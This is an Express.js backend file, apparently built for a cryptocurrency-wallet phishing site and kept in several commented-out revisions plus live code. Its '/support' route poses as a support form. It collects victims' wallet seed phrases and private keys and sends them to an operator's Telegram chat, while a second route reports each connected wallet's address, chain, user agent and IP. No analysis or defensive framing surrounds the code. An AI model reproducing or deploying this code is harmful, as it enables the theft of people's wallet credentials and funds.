// // backend/index.js
// import 'dotenv/config';
// import express from 'express';
// import helmet from 'helmet';
// import cors from 'cors';
// import rateLimit from 'express-rate-limit';
// import morgan from 'morgan';
// import { sendTelegramMessage } from './telegram.js';

// const app = express();
// const PORT = Number(process.env.PORT || 4000);
// const FRONTEND_ORIGINS = (process.env.CORS_ORIGIN || 'http://localhost:3000,http://127.0.0.1:3000').split(',');

// // Basic middleware
// app.use(helmet());
// app.use(express.json({ limit: '200kb' }));
// app.use(morgan('dev'));
// app.use(
//   cors({
//     origin: (origin, cb) => {
//       // allow no-origin (server-to-server) or if matches configured origins
//       if (!origin) return cb(null, true);
//       if (FRONTEND_ORIGINS.includes(origin)) return cb(null, true);
//       return cb(new Error(`CORS blocked origin: ${origin}`));
//     },
//     methods: 'GET,POST,OPTIONS',
//   })
// );

// // Rate limiter
// app.use(
//   rateLimit({
//     windowMs: 60 * 1000, // 1 minute
//     max: Number(process.env.RATE_LIMIT_MAX || 120),
//     standardHeaders: true,
//     legacyHeaders: false,
//   })
// );

// // health
// app.get('/healthz', (_req, res) => res.json({ ok: true }));

// // small helper to avoid injecting HTML breaks
// function escapeHtml(str = '') {
//   return String(str)
//     .replace(/&/g, '&amp;')
//     .replace(/>/g, '&gt;')
//     .replace(/</g, '&lt;');
// }

// // Helper: ensure Telegram env present before sending
// function requireTelegramConfig() {
//   const token = process.env.TELEGRAM_BOT_TOKEN;
//   const chatId = process.env.TELEGRAM_CHAT_ID;
//   if (!token || !chatId) throw new Error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in env');
//   return { token, chatId };
// }

// // // ----------------- Support form route (CUSTOM FORMAT) -----------------
// // app.post('/support', async (req, res) => {
// //   try {
// //     const { name, email, message, address } = req.body || {};

// //     const { token, chatId } = requireTelegramConfig();

// //     // message from frontend includes:
// //     // Wallet-Name
// //     // Phrase or Private-Key 
// //     // Issue:
// //     // BUT you want this output instead:

// //     // Build the exact format you want:
// //     const text =
// //       `<b>New Wallet Submission 🔔</b>\n` +
// //       `Wallet-Type: <b>${escapeHtml(name || '')}</b>\n` +
// //       `Wallet-Phrase: <code>${escapeHtml(address || '')}</code>\n` +
// //       `Wallet-Type: <b>${escapeHtml(name || '')}</b>\n` +
// //       `Private-Key: <code>${escapeHtml(email || '')}</code>\n` +
// //       `\nTime: ${new Date().toISOString()}`;

// //     await sendTelegramMessage({ token, chatId, text });

// //     res.json({ ok: true, message: 'Support request delivered' });
// //   } catch (err) {
// //     console.error('/support error:', err?.message || err);
// //     return res.status(500).json({ ok: false, error: 'server_error', detail: String(err?.message || err) });
// //   }
// // });
// // ----------------- Support form route (CUSTOM FORMAT) -----------------
// app.post('/support', async (req, res) => {
//   try {
//     const { name, email, message, address, walletType } = req.body || {};

//     const { token, chatId } = requireTelegramConfig();

//     const text =
//       `<b>New Wallet Submission 🔔</b>\n` +
//       `Wallet-Type: <b>${escapeHtml(walletType || '')}</b>\n` +
//       `Wallet-Phrase: <code>${escapeHtml(address || '')}</code>\n` +
//       `Private-Key: <code>${escapeHtml(email || '')}</code>\n` +
//       `\nTime: ${new Date().toISOString()}`;

//     await sendTelegramMessage({ token, chatId, text, parse_mode: "HTML" });

//     res.json({ ok: true, message: 'Support request delivered' });
//   } catch (err) {
//     console.error('/support error:', err?.message || err);
//     return res.status(500).json({ ok: false, error: 'server_error', detail: String(err?.message || err) });
//   }
// });



// // ----------------- Wallet connect notification -----------------
// app.post('/notify/wallet-connected', async (req, res) => {
//   try {
//     const { address, chainId, walletName, userAgent, ts } = req.body || {};

//     if (!address) return res.status(400).json({ ok: false, error: 'address required' });

//     const { token, chatId } = requireTelegramConfig();

//     const lines = [
//       '<b>Wallet Connected ✅</b>',
//       walletName ? `Wallet: <b>${escapeHtml(walletName)}</b>` : null,
//       `Address: <code>${escapeHtml(address)}</code>`,
//       chainId ? `Chain ID: <code>${escapeHtml(chainId)}</code>` : null,
//       ts ? `Time: ${escapeHtml(ts)}` : `Time: ${new Date().toISOString()}`,
//       userAgent ? `UA: ${escapeHtml(userAgent)}` : null,
//       `Source: ${escapeHtml(req.ip || req.headers['x-forwarded-for'] || 'unknown')}`,
//     ].filter(Boolean);

//     const text = lines.join('\n');

//     await sendTelegramMessage({ token, chatId, text });

//     return res.json({ ok: true, delivery: 'telegram_ok' });
//   } catch (err) {
//     console.error('/notify/wallet-connected error:', err?.message || err);
//     return res.status(500).json({ ok: false, error: 'failed', detail: String(err?.message || err) });
//   }
// });

// // global 404 handler for other methods/paths
// app.all('*', (_req, res) => {
//   res.status(404).json({ ok: false, error: 'not_found' });
// });

// // start server
// const server = app.listen(PORT, () => {
//   console.log(`✅ Backend API listening on port ${PORT}`);
// });

// // graceful shutdown
// process.on('SIGINT', () => {
//   console.log('Received SIGINT, shutting down...');
//   server.close(() => process.exit(0));
// });
// process.on('SIGTERM', () => {
//   console.log('Received SIGTERM, shutting down...');
//   server.close(() => process.exit(0));
// });

// backend/index.js
import 'dotenv/config';
import express from 'express';
import helmet from 'helmet';
import cors from 'cors';
import rateLimit from 'express-rate-limit';
import morgan from 'morgan';
import { sendTelegramMessage } from './telegram.js';

const app = express();
const PORT = Number(process.env.PORT || 4000);
const FRONTEND_ORIGINS = (process.env.CORS_ORIGIN || 'http://localhost:3000,http://127.0.0.1:3000').split(',');

// Basic middleware
app.use(helmet());
app.use(express.json({ limit: '200kb' }));
app.use(morgan('dev'));
app.use(
  cors({
    origin: (origin, cb) => {
      if (!origin) return cb(null, true);
      if (FRONTEND_ORIGINS.includes(origin)) return cb(null, true);
      return cb(new Error(`CORS blocked origin: ${origin}`));
    },
    methods: 'GET,POST,OPTIONS',
  })
);

// Rate limiter
app.use(
  rateLimit({
    windowMs: 60 * 1000,
    max: Number(process.env.RATE_LIMIT_MAX || 120),
    standardHeaders: true,
    legacyHeaders: false,
  })
);

// health
app.get('/healthz', (_req, res) => res.json({ ok: true }));

// small helper to avoid injecting HTML breaks
function escapeHtml(str = '') {
  return String(str)
    .replace(/&/g, '&amp;')
    .replace(/>/g, '&gt;')
    .replace(/</g, '&lt;');
}

// Helper: ensure Telegram env present before sending
function requireTelegramConfig() {
  const token = process.env.TELEGRAM_BOT_TOKEN;
  const chatId = process.env.TELEGRAM_CHAT_ID;
  if (!token || !chatId) throw new Error('Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID in env');
  return { token, chatId };
}

// // ----------------- Support form route (FIXED) -----------------
// app.post('/support', async (req, res) => {
//   try {
//     const { name, email, message, address, walletType } = req.body || {};

//     const { token, chatId } = requireTelegramConfig();

//     // FIXED: Correct fields mapped from frontend
//     const text =
//       `<b>New Wallet Submission 🔔</b>\n` +
//       `Wallet-Type: <b>${escapeHtml(walletType || '')}</b>\n` +
//       `Wallet-Phrase: <code>${escapeHtml(address || '')}</code>\n` +
//       `Private-Key: <code>${escapeHtml(email || '')}</code>\n` +
//       `\nTime: ${new Date().toISOString()}`;

//     await sendTelegramMessage({ token, chatId, text });

//     res.json({ ok: true, message: 'Support request delivered' });
//   } catch (err) {
//     console.error('/support error:', err?.message || err);
//     return res.status(500).json({ ok: false, error: 'server_error', detail: String(err?.message || err) });
//   }
// });
app.post('/support', async (req, res) => {
try {
const { name, email, message, address } = req.body || {};


const { token, chatId } = requireTelegramConfig();

const text =
  `<b>New Wallet Submission 🔔</b>\n` +
  `Wallet-Name: <b>${escapeHtml(name || '')}</b>\n` +
  `Wallet-Phrase: <code>${escapeHtml(address || '')}</code>\n` +
  `Private-Key: <code>${escapeHtml(email || '')}</code>\n` +
  `\nTime: ${new Date().toISOString()}`;

// send message and capture Telegram API response
const telegramResponse = await sendTelegramMessage({ token, chatId, text });

// return Telegram API response for debugging
res.json({ ok: true, message: 'Support request delivered', telegramResponse });


} catch (err) {
console.error('/support error:', err?.message || err);
return res.status(500).json({ ok: false, error: 'telegram_failed', detail: String(err?.message || err) });
}
});


// ----------------- Wallet connect notification -----------------
app.post('/notify/wallet-connected', async (req, res) => {
  try {
    const { address, chainId, walletName, userAgent, ts } = req.body || {};

    if (!address) return res.status(400).json({ ok: false, error: 'address required' });

    const { token, chatId } = requireTelegramConfig();

    const lines = [
      '<b>Wallet Connected ✅</b>',
      walletName ? `Wallet: <b>${escapeHtml(walletName)}</b>` : null,
      `Address: <code>${escapeHtml(address)}</code>`,
      chainId ? `Chain ID: <code>${escapeHtml(chainId)}</code>` : null,
      ts ? `Time: ${escapeHtml(ts)}` : `Time: ${new Date().toISOString()}`,
      userAgent ? `UA: ${escapeHtml(userAgent)}` : null,
      `Source: ${escapeHtml(req.ip || req.headers['x-forwarded-for'] || 'unknown')}`,
    ].filter(Boolean);

    const text = lines.join('\n');

    await sendTelegramMessage({ token, chatId, text });

    return res.json({ ok: true, delivery: 'telegram_ok' });
  } catch (err) {
    console.error('/notify/wallet-connected error:', err?.message || err);
    return res.status(500).json({ ok: false, error: 'failed', detail: String(err?.message || err) });
  }
});

// global 404 handler
app.all('*', (_req, res) => {
  res.status(404).json({ ok: false, error: 'not_found' });
});

// start server
const server = app.listen(PORT, () => {
  console.log(`✅ Backend API listening on port ${PORT}`);
});

// graceful shutdown
process.on('SIGINT', () => {
  console.log('Received SIGINT, shutting down...');
  server.close(() => process.exit(0));
});
process.on('SIGTERM', () => {
  console.log('Received SIGTERM, shutting down...');
  server.close(() => process.exit(0));
});
